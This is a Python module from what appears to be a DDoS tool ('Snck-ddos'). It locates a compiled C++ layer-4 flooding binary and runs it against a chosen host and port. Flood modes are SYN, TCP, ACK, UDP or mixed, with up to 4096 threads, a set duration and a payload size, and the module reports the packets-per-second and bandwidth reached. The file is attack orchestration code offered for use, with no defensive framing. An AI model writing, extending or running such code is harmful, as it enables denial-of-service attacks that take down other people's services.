# language: Python 3.11+, file: core/cpp_bridge.py
"""Launch the C++ L4 core when available — far higher pps than pure Python."""

from __future__ import annotations

import asyncio
import os
import re
import shutil
from pathlib import Path
from typing import Optional

ROOT = Path(__file__).resolve().parent.parent
CANDIDATES = [
    ROOT / "cpp" / "snck_l4",
    Path("/usr/local/bin/snck_l4"),
    Path.home() / "Snck-ddos" / "cpp" / "snck_l4",
]


def find_binary() -> Optional[Path]:
    for p in CANDIDATES:
        if p.is_file() and os.access(p, os.X_OK):
            return p
    which = shutil.which("snck_l4")
    return Path(which) if which else None


async def run_l4(
    method: str,
    host: str,
    port: int,
    threads: int,
    duration: int,
    payload_size: int = 1024,
) -> dict:
    binary = find_binary()
    if not binary:
        return {"ok": False, "error": "snck_l4 binary not found — run cpp/build.sh"}

    method = method.lower()
    if method not in ("syn", "tcp", "ack", "udp", "mix"):
        method = "udp"

    cmd = [
        str(binary),
        method,
        host,
        str(port),
        str(max(1, min(threads, 4096))),
        str(max(1, duration)),
        str(max(16, min(payload_size, 65507))),
    ]

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    last = {"packets": 0, "bytes": 0, "errors": 0, "pps": 0.0, "mbps": 0.0}

    async def _read() -> None:
        assert proc.stdout
        while True:
            line = await proc.stdout.readline()
            if not line:
                break
            text = line.decode(errors="ignore").strip()
            m = re.search(
                r"packets=(\d+)\s+bytes=(\d+)\s+errors=(\d+)\s+pps=([0-9.]+)\s+mbps=([0-9.]+)",
                text,
            )
            if m:
                last["packets"] = int(m.group(1))
                last["bytes"] = int(m.group(2))
                last["errors"] = int(m.group(3))
                last["pps"] = float(m.group(4))
                last["mbps"] = float(m.group(5))

    reader = asyncio.create_task(_read())
    await proc.wait()
    await reader
    last["ok"] = True
    last["returncode"] = proc.returncode
    return last
